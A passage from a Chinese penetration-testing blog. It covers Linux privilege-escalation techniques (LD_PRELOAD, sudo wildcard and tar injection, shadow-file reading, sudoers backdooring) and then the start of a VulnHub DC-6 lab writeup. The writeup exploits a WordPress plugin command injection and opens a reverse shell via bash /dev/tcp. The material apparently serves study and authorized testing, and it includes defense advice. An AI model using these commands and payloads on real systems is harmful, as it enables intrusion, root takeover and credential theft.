-p&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-编译与执行"><a href="#4-3-编译与执行" class="headerlink" title="4.3 编译与执行"></a>4.3 编译与执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -nostartfiles -o /dev/shm/evil.so evil.c</span><br><span class="line"><span class="built_in">sudo</span> LD_PRELOAD=/dev/shm/evil.so /usr/bin/some_target</span><br><span class="line"><span class="comment"># 获得 root shell</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>注意</strong>：<code>/tmp</code> 常挂载 <code>nosuid</code> 导致共享库无效，换用 <code>/dev/shm</code>。</p>
+</blockquote>
+<hr>
+<h2 id="五、LD-LIBRARY-PATH-劫持"><a href="#五、LD-LIBRARY-PATH-劫持" class="headerlink" title="五、LD_LIBRARY_PATH 劫持"></a>五、LD_LIBRARY_PATH 劫持</h2><p>修改动态链接器搜索路径，提供同名恶意库劫持目标程序。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 查看依赖库</span></span><br><span class="line">ldd /usr/bin/some_target</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 编写恶意版依赖库（同名，含提权逻辑）</span></span><br><span class="line"><span class="comment">#    编译：gcc -shared -fPIC -o /tmp/libtarget.so evil.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 执行</span></span><br><span class="line"><span class="built_in">sudo</span> LD_LIBRARY_PATH=/tmp /usr/bin/some_target</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>现代Linux的SUID程序处于secure-execution模式会<strong>忽略</strong> <code>LD_LIBRARY_PATH</code>。此技巧仅对因Sudo <code>SETENV</code> 而继承环境变量的<strong>非SUID程序</strong>有效。</p>
+</blockquote>
+<hr>
+<h2 id="六、Sudo通配符技巧"><a href="#六、Sudo通配符技巧" class="headerlink" title="六、Sudo通配符技巧"></a>六、Sudo通配符技巧</h2><p>当 <code>sudo -l</code> 返回带通配符的命令时，可利用文件系统特性绕过路径限制。</p>
+<h3 id="6-1-符号链接绕过"><a href="#6-1-符号链接绕过" class="headerlink" title="6.1 符号链接绕过"></a>6.1 符号链接绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 场景：sudo -l → (root) NOPASSWD: /usr/bin/cat /var/log/*</span></span><br><span class="line"><span class="built_in">ln</span> -s /etc/shadow /var/log/zzz_shadow</span><br><span class="line"><span class="built_in">sudo</span> /usr/bin/cat /var/log/zzz_shadow    <span class="comment"># 实际读取 /etc/shadow</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-参数注入（tar通配符）"><a href="#6-2-参数注入（tar通配符）" class="headerlink" title="6.2 参数注入（tar通配符）"></a>6.2 参数注入（tar通配符）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 场景：sudo tar cf archive.tar *</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;payload&#x27;</span> &gt; <span class="string">&#x27;--checkpoint=1&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;payload&#x27;</span> &gt; <span class="string">&#x27;--checkpoint-action=exec=sh shell.sh&#x27;</span></span><br><span class="line"><span class="built_in">cat</span> &gt; shell.sh &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">chmod</span> +s /bin/bash</span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">chmod</span> +x shell.sh</span><br><span class="line"><span class="built_in">sudo</span> tar cf /tmp/backup.tar /tmp/*</span><br><span class="line"><span class="comment"># tar 将通配符展开的文件名解释为参数，执行 shell.sh</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-通配符注入速查"><a href="#6-3-通配符注入速查" class="headerlink" title="6.3 通配符注入速查"></a>6.3 通配符注入速查</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>注入方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>tar</code></td>
+<td><code>--checkpoint=1</code> + <code>--checkpoint-action=exec=...</code></td>
+</tr>
+<tr>
+<td><code>zip</code></td>
+<td><code>zip -T -TT &quot;id; zsh&quot;</code></td>
+</tr>
+<tr>
+<td><code>chown</code></td>
+<td><code>--reference=file</code> 改变目标所有者</td>
+</tr>
+<tr>
+<td><code>rsync</code></td>
+<td><code>-e</code> 参数注入命令</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="七、NOPASSWD-权限滥用"><a href="#七、NOPASSWD-权限滥用" class="headerlink" title="七、NOPASSWD 权限滥用"></a>七、NOPASSWD 权限滥用</h2><p>任意命令被标记为 <code>NOPASSWD</code> 时无需密码即可执行，可肆意操作。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 提取密码哈希</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cat</span> /etc/shadow                <span class="comment"># → 离线爆破: john/hashcat</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 写入SSH公钥</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAA...&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> /root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 追加sudo权限</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hacker ALL=(ALL) NOPASSWD: ALL&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> -a /etc/sudoers</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 配合GTFOBins直接提权</span></span><br><span class="line"><span class="built_in">sudo</span> awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="八、提权流程总览"><a href="#八、提权流程总览" class="headerlink" title="八、提权流程总览"></a>八、提权流程总览</h2><pre class="mermaid">flowchart TD
+    A[获得初始Shell] --> B[枚举SUID: find / -perm -4000]
+    B --> C{发现可利用SUID?}
+    C -->|是| E[GTFOBins利用 → 获得root]
+    C -->|否| F[审计 sudo -l]
+    F --> G{存在NOPASSWD?}
+    G -->|是| H[GTFOBins/通配符利用]
+    G -->|否| I{存在SETENV?}
+    I -->|是| J[LD_PRELOAD劫持]
+    I -->|否| K[尝试CVE/溢出: CVE-2021-3156等]
+    H --> E
+    J --> E
+    K --> E</pre>
+
+<hr>
+<h2 id="九、自动化工具"><a href="#九、自动化工具" class="headerlink" title="九、自动化工具"></a>九、自动化工具</h2><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>用途</th>
+<th>命令示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng">linPEAS</a></td>
+<td>综合提权审计</td>
+<td><code>./linpeas.sh -a</code></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a></td>
+<td>SUID&#x2F;Sudo利用词典</td>
+<td>在线查阅</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">pspy</a></td>
+<td>无root进程监控</td>
+<td><code>./pspy64</code></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/TH3xACE/SUDO_KILLER">sudo_killer</a></td>
+<td>Sudo配置专项审计</td>
+<td><code>./sudo_killer.sh -c</code></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/liamg/traitor">traitor</a></td>
+<td>自动化多向量提权</td>
+<td><code>traitor -p</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="十、常见坑点"><a href="#十、常见坑点" class="headerlink" title="十、常见坑点"></a>十、常见坑点</h2><table>
+<thead>
+<tr>
+<th>现象</th>
+<th>原因</th>
+<th>补救</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>./bash -p</code> 仍为普通shell</td>
+<td>现代bash编译时禁用SUID特权保留</td>
+<td>改用 <code>python/perl/find</code></td>
+</tr>
+<tr>
+<td><code>find -exec /bin/sh</code> 无root</td>
+<td>shell丢弃特权</td>
+<td>添加 <code>-p</code> 参数或换用 <code>bash -p</code></td>
+</tr>
+<tr>
+<td>LD_PRELOAD在&#x2F;tmp无效</td>
+<td><code>/tmp</code> 挂载 <code>nosuid</code></td>
+<td>换到 <code>/dev/shm</code> 或 <code>/var/tmp</code></td>
+</tr>
+<tr>
+<td>GTFOBins命令不工作</td>
+<td>二进制版本差异</td>
+<td>查看具体发行版文档</td>
+</tr>
+<tr>
+<td>sudo无SETENV仍可设LD_PRELOAD</td>
+<td><code>env_reset</code>默认关闭</td>
+<td>现代sudo默认 <code>env_reset</code>，通常不行</td>
+</tr>
+</tbody></table>
+<h3 id="Sudo版本与已知CVE"><a href="#Sudo版本与已知CVE" class="headerlink" title="Sudo版本与已知CVE"></a>Sudo版本与已知CVE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> --version   <span class="comment"># 确认版本</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>CVE-2019-14287</strong>：<code>sudo -u#-1</code> 绕过用户检查（sudo &lt; 1.8.28）</li>
+<li><strong>CVE-2021-3156</strong>（Baron Samedit）：堆缓冲区溢出，sudo 1.8.2–1.9.5p1受影响，无需密码提权</li>
+</ul>
+<hr>
+<h2 id="十一、防御建议"><a href="#十一、防御建议" class="headerlink" title="十一、防御建议"></a>十一、防御建议</h2><ol>
+<li><strong>最小化SUID</strong>：审计 <code>find / -perm -4000</code> 并移除不必要SUID位：<code>chmod u-s /path/to/binary</code></li>
+<li><strong>收紧Sudo策略</strong>：避免通配符、<code>ALL</code>、<code>NOPASSWD</code>，精确指定允许的命令与参数</li>
+<li><strong>限制SETENV</strong>：除非确有必要，否则不在 sudoers 中标注 <code>SETENV</code></li>
+<li><strong>及时更新</strong>：修补 sudo 已知CVE，保持系统补丁在最新状态</li>
+<li><strong>审计日志</strong>：<code>Defaults logfile=&quot;/var/log/sudo.log&quot;</code>；使用auditd监控 <code>/etc/sudoers</code></li>
+<li><strong>文件完整性监控</strong>：AIDE、Tripwire 等工具监控关键SUID文件的变更</li>
+</ol>
+<hr>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><blockquote>
+<p><strong>本文仅供安全研究与授权测试学习参考，严禁用于非法入侵。</strong></p>
+<p>渗透测试应仅限于已获得<strong>书面授权</strong>的系统。滥用文中技术可能导致民事赔偿与刑事起诉。作者不承担因读者误用而产生的任何法律责任。发现漏洞请遵循负责任披露流程（Responsible Disclosure）。</p>
+</blockquote>
+<hr>
+<h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a></li>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">HackTricks — Linux Privilege Escalation</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation">PayloadsAllTheThings — PE</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">CVE-2021-3156 分析</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng">linPEAS</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/SQL-injection-error-based/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/SQL-injection-error-based/" class="post-title-link" itemprop="url">SQL 注入：报错注入实战</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-09-01 08:00:00" itemprop="dateCreated datePublished" datetime="2024-09-01T08:00:00+08:00">2024-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>当联合查询回显位被禁用时，利用数据库报错函数将敏感数据"弹出"到错误信息中——extractvalue、updatexml、floor 三大报错注入手法全覆盖。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/SQL-injection-error-based/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/VulnHub-DC6-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/VulnHub-DC6-writeup/" class="post-title-link" itemprop="url">VulnHub DC-6靶机实战</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-09-01 08:00:00" itemprop="dateCreated datePublished" datetime="2024-09-01T08:00:00+08:00">2024-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:46" itemprop="dateModified" datetime="2026-06-04T23:34:46+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本文提供的渗透测试技术与方法仅供学习研究与授权安全测试使用。<strong>严禁</strong>利用文中技术对未授权系统进行任何形式的攻击。读者因不当使用文中技术所造成的一切后果（包括但不限于法律纠纷、服务中断、数据丢失）均与作者无关。靶机 <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-6,315/">DC-6</a> 来自 VulnHub 平台，仅作渗透测试实训用途。</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DC-6 是 VulnHub 上 DC 靶机系列的第六台，由 <a target="_blank" rel="noopener" href="https://www.vulnhub.com/author/dcau,596/">DCAU</a> 制作。相比前作，DC-6 引入了 <strong>WordPress 插件漏洞</strong>作为核心突破口，结合 Linux 本地提权。靶机难度为<strong>初学者到中级</strong>，非常适合练习 Web 应用安全与 Linux 提权。本文记录从信息收集到获取 root 的全流程。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><table>
+<thead>
+<tr>
+<th>组件</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击机</td>
+<td>Kali Linux 2024.x (10.0.2.15)</td>
+</tr>
+<tr>
+<td>靶机</td>
+<td>VulnHub DC-6 (VirtualBox&#x2F;VMware)</td>
+</tr>
+<tr>
+<td>网络模式</td>
+<td>NAT 网络（同网段）</td>
+</tr>
+</tbody></table>
+<p>解压 OVA 导入 VirtualBox 或 VMware，确保目标与 Kali 互通即可。DC-6 启动后不会直接显示 IP，需通过扫描发现。</p>
+<h2 id="渗透流程图"><a href="#渗透流程图" class="headerlink" title="渗透流程图"></a>渗透流程图</h2><pre class="mermaid">flowchart TD
+    A[信息收集：主机发现] --> B[端口扫描：nmap]
+    B --> C[Web枚举：WordPress识别]
+    C --> D{WPScan枚举插件}
+    D -->|发现| E[Activity Monitor插件]
+    E --> F{CVE-2018-15877}
+    F --> G[命令注入验证]
+    G --> H[反弹Shell获取www-data]
+    H --> I[本地信息枚举]
+    I --> J{发现SUID文件}
+    J --> K[nmap SUID提权]
+    K --> L[root权限]
+    L --> M[读取/root/proof.txt]</pre>
+
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1 主机发现"></a>1.1 主机发现</h3><p>使用 <code>arp-scan</code> 扫描本地网段，识别存活主机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> arp-scan -l</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="built_in">sudo</span> netdiscover -r 10.0.2.0/24</span><br></pre></td></tr></table></figure>
+
+<p>输出示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.0.2.5   08:00:27:ab:cd:ef   PCS Systemtechnik GmbH</span><br><span class="line">10.0.2.15  08:00:27:12:34:56   PCS Systemtechnik GmbH  # Kali</span><br></pre></td></tr></table></figure>
+
+<p>排除自身 IP 后，<code>10.0.2.5</code> 即 DC-6 靶机。写入环境变量方便后续操作：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> TARGET=10.0.2.5</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-端口扫描"><a href="#1-2-端口扫描" class="headerlink" title="1.2 端口扫描"></a>1.2 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -T4 -A -v <span class="variable">$TARGET</span> -oN nmap-full.txt</span><br></pre></td></tr></table></figure>
+
+<p>关键结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br></pre></td></tr></table></figure>
+
+<p>靶机仅开放 <strong>22 (SSH)</strong> 与 <strong>80 (HTTP)</strong>，攻击面集中在 Web。</p>
+<h3 id="1-3-Web-指纹识别"><a href="#1-3-Web-指纹识别" class="headerlink" title="1.3 Web 指纹识别"></a>1.3 Web 指纹识别</h3><p>浏览器访问 <code>http://10.0.2.5</code>，页面标题：”Dumy’s Blog | Just another WordPress site”。使用 whatweb 确认：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://<span class="variable">$TARGET</span></span><br></pre></td></tr></table></figure>
+
+<p>目标确认为 <strong>WordPress 站点</strong>，运行于 Apache&#x2F;2.4.25 (Debian)。</p>
+<h2 id="二、漏洞发现"><a href="#二、漏洞发现" class="headerlink" title="二、漏洞发现"></a>二、漏洞发现</h2><h3 id="2-1-hosts-配置"><a href="#2-1-hosts-配置" class="headerlink" title="2.1 hosts 配置"></a>2.1 hosts 配置</h3><p>DC-6 的 WordPress 内部绑定域名为 <code>wordy</code>，直接通过 IP 访问会出现样式丢失和链接异常。需配置 <code>/etc/hosts</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.0.2.5  wordy&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>此后通过 <code>http://wordy</code> 访问即可获得完整页面。这也是 VulnHub 官方的初始提示。</p>
+<h3 id="2-2-WPScan-枚举用户"><a href="#2-2-WPScan-枚举用户" class="headerlink" title="2.2 WPScan 枚举用户"></a>2.2 WPScan 枚举用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ --enumerate u</span><br></pre></td></tr></table></figure>
+
+<p>发现 5 个 WordPress 用户：<code>admin</code>、<code>graham</code>、<code>mark</code>、<code>sarah</code>、<code>jens</code>。官方提示密码字典可从 <code>rockyou.txt</code> 生成，DC-6 提供了精简字典线索——在 Kali 中找到官方预留的字典文件后暴力破解。</p>
+<h3 id="2-3-暴力破解与后台登录"><a href="#2-3-暴力破解与后台登录" class="headerlink" title="2.3 暴力破解与后台登录"></a>2.3 暴力破解与后台登录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ -U users.txt -P dc6-passwords.txt</span><br></pre></td></tr></table></figure>
+
+<p>成功获取至少一组有效凭据（如 <code>graham</code> &#x2F; <code>sarah</code> &#x2F; <code>mark</code> 之一），登录 <code>/wp-admin</code> 后台。当前用户权限有限，无法直接编辑主题或插件。</p>
+<h3 id="2-4-插件漏洞发现"><a href="#2-4-插件漏洞发现" class="headerlink" title="2.4 插件漏洞发现"></a>2.4 插件漏洞发现</h3><p>再次运行 wpscan 枚举插件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ --enumerate p</span><br></pre></td></tr></table></figure>
+
+<p>关键输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+] activity-monitor</span><br><span class="line"> | Location: http://wordy/wp-content/plugins/activity-monitor/</span><br><span class="line"> | Latest Version: 3.7 (up to date)</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"></span><br><span class="line">[!] Version 3.7 is vulnerable to (Unauthenticated) Command Injection</span><br><span class="line">    Reference: CVE-2018-15877</span><br></pre></td></tr></table></figure>
+
+<p>Activity Monitor 插件 <strong>3.7 版本</strong>存在未授权的<strong>命令注入漏洞</strong>，编号 <strong>CVE-2018-15877</strong>。</p>
+<h2 id="三、漏洞利用（CVE-2018-15877）"><a href="#三、漏洞利用（CVE-2018-15877）" class="headerlink" title="三、漏洞利用（CVE-2018-15877）"></a>三、漏洞利用（CVE-2018-15877）</h2><h3 id="3-1-原理分析"><a href="#3-1-原理分析" class="headerlink" title="3.1 原理分析"></a>3.1 原理分析</h3><p>Activity Monitor 是一款 WordPress 后台仪表盘插件，用于展示网站活动日志。漏洞根源在于处理 AJAX 请求时，对用户可控的 <code>ip</code> 参数未做充分过滤，直接将字符串拼接到 <code>ping</code> 命令中执行。</p>
+<p>后端伪代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ping -c 1 &quot;</span> . <span class="variable">$ip</span>);</span><br></pre></td></tr></table></figure>
+
+<p>由于未使用 <code>escapeshellarg()</code> 保护，攻击者可通过分号 <code>;</code> 注入任意系统命令。<strong>任何可访问后台的用户均可触发</strong>，无需管理员权限。</p>
+<h3 id="3-2-手动验证"><a href="#3-2-手动验证" class="headerlink" title="3.2 手动验证"></a>3.2 手动验证</h3><p>Burp Suite 截获请求，改造 POST 测试命令注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /wp-admin/admin-post.php HTTP/1.1</span><br><span class="line">Host: wordy</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: wordpress_logged_in_xxx=xxx</span><br><span class="line"></span><br><span class="line">action=activemon_ping&amp;ip=127.0.0.1;id</span><br></pre></td></tr></table></figure>
+
+<p>响应中出现 <code>uid=33(www-data)</code> 则说明命令成功执行。</p>
+<h3 id="3-3-反弹-Shell"><a href="#3-3-反弹-Shell" class="headerlink" title="3.3 反弹 Shell"></a>3.3 反弹 Shell</h3><p>在 Kali 监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
+
+<p>构造反弹 Payload，URL 编码后嵌入 <code>ip</code> 参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;bash+-c+&#x27;exec+bash+-i+%26&gt;/dev/tcp/10.0.2.15/4444+&lt;%261&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>或通过 base64 编码写入 Python 反弹脚本执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;echo+&#x27;aW1wb3J0IHNvY2tldC...&#x27;|base64+-d&gt;/tmp/shell.py;python+/tmp/shell.py</span><br></pre></td></tr></table></figure>
+
+<p>成功后获得 <code>www-data</code> Shell。升级为交互式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"><span class="comment"># Ctrl+Z 背景化</span></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br></pre></td></tr></table></figure>
+
